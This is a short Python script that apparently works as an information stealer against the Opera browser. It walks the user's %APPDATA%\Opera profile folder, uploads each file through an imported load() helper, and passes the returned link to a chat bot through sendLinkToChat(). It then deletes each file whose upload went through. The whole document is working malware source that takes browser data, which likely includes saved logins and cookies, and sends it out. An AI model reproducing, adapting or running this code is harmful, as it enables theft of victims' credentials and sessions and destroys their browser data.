import os
from loader import load
from bot import sendLinkToChat
from requests.exceptions import ConnectionError

PATH = os.getenv("appdata") + "\\Opera"

def searchFiles() -> list:
	try:
		files = os.listdir(PATH)
		if files:
			return files
	except FileNotFoundError:
		return False
	else:
		return False

files = searchFiles()
if files:
	for file in files:
		try:
			path = PATH + f"\\{file}"
			try:
				link = load(path.replace("\\", "/"))
				if link:
					sendLinkToChat(link)
			except ConnectionError:
				pass
			else:
				os.remove(path)
		except ConnectionError:
			break